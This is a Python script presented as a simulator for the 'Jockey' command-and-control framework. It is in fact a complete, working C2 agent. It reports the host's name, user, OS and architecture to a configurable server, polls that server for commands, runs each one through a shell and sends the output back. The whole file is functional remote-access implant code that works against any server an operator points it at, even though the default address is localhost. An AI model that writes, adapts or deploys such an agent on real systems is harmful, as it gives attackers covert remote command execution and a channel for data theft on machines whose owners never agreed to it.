#!/usr/bin/env python3
"""Jockey C2 agent simulator — talks the same protocol as the real agent."""
import os
import sys
import time
import uuid
import socket
import platform
import subprocess
import requests

C2_URL    = os.environ.get("C2_URL",    "http://127.0.0.1:8080")
AGENT_KEY = os.environ.get("C2_AGENT_KEY", "changeme-agent-key")
AGENT_ID  = os.environ.get("C2_ID",     "")

HEADERS = {"X-Agent-Key": AGENT_KEY, "Content-Type": "application/json"}


def checkin():
    global AGENT_ID
    info = {
        "id":       AGENT_ID or None,
        "hostname": socket.gethostname(),
        "user":     os.environ.get("USER", ""),
        "os":       platform.system(),
        "arch":     platform.machine(),
        "pid":      os.getpid(),
    }
    r = requests.post(f"{C2_URL}/agent/checkin", json=info, headers=HEADERS, timeout=10)
    r.raise_for_status()
    AGENT_ID = r.json()["id"]
    print(f"[agent] checked in as {AGENT_ID}")


def beacon():
    r = requests.get(f"{C2_URL}/agent/beacon/{AGENT_ID}", headers=HEADERS, timeout=40)
    if r.status_code == 204:
        return None
    r.raise_for_status()
    return r.json()


def submit(cmd_id, output):
    requests.post(
        f"{C2_URL}/agent/result/{AGENT_ID}",
        json={"cmd_id": cmd_id, "result": output},
        headers=HEADERS, timeout=10,
    )


def run_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        out = r.stdout
        if r.stderr:
            out += ("\n" if out else "") + "[stderr]\n" + r.stderr
        if r.returncode != 0:
            out += f"\n[exit {r.returncode}]"
        return out or "(no output)"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {e}"


def main():
    checkin()
    print("[agent] listening for commands")
    while True:
        try:
            job = beacon()
            if not job:
                continue
            cid = job["cmd_id"]
            cmd = job["cmd"]
            print(f"[agent] #{cid}: {cmd}")
            out = run_cmd(cmd)
            submit(cid, out)
        except requests.exceptions.RequestException as e:
            print(f"[agent] network error: {e}")
            time.sleep(5)
        except KeyboardInterrupt:
            print("\n[agent] exiting")
            break


if __name__ == "__main__":
    main()
